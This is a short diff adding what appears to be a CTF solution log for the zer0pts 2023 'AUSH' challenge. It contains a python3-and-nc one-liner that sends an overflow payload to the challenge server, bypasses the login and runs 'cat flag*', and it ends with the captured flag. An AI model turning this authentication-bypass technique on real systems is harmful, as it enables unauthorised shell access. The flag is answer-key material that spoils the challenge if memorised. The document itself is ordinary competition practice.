@@ -1,0 +1,11 @@
+$ (python3 -c "print('a'*0x1a0); print('a'*0x80+'\x00'*0x140)"; cat) | nc pwn.2023.zer0pts.com 9006
+ _______________________________________
+< Welcome to AUSH: AUthenticated SHell! >
+ ---------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Username: Password: cat flag*
+zer0pts{p0lLut3_7h3_3nv1r0nnnNNnnnNnnnnNNNnnNnnNn}
